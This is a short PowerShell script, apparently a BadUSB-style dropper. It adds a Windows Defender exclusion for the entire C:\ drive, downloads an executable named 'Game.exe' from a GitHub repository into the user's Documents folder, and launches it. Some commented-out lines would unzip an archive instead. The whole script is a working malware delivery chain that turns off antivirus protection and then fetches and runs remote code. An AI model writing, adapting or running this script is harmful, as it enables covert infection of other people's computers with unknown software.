Add-MpPreference -ExclusionPath "C:\"

$url = "https://github.com/knoxoxen/flipperstuffs/raw/main/Game.exe"
$destination = "$env:USERPROFILE\Documents\Game.exe"
Invoke-WebRequest -Uri $url -OutFile $destination



#Extract the ZIP file:
#$zipPath = "$env:USERPROFILE\Documents\Game.zip"
#$extractPath = "$env:USERPROFILE\Documents\GameUnzipped"
#Expand-Archive -Path $zipPath -DestinationPath $extractPath -F

#Run the EXE file:
$exePath = "$env:USERPROFILE\Documents\Game.exe"
Start-Process -FilePath $exePath
